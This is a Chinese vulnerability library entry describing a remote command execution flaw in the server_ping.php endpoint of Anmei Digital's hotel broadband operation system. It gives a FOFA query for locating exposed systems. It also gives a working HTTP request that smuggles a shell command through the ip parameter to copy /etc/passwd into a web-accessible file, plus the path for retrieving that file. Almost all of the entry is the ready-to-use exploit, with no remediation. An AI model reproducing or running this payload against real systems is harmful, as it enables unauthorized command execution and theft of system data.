---
fofa: "酒店宽带运营"
source: "wy876 漏洞文库"
---

# 酒店宽带运营系统server_ping远程命令执行漏洞

# 一、漏洞简介
安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行。

# 二、影响版本
+ 安美数字 酒店宽带运营系统

# 三、资产测绘
+ fofa`"酒店宽带运营"`
+ 特征


# 四、漏洞复现
```rust
GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../stc.txt&id=1 HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04
```


```rust
/stc.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gvrg0qu31td8ab01>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
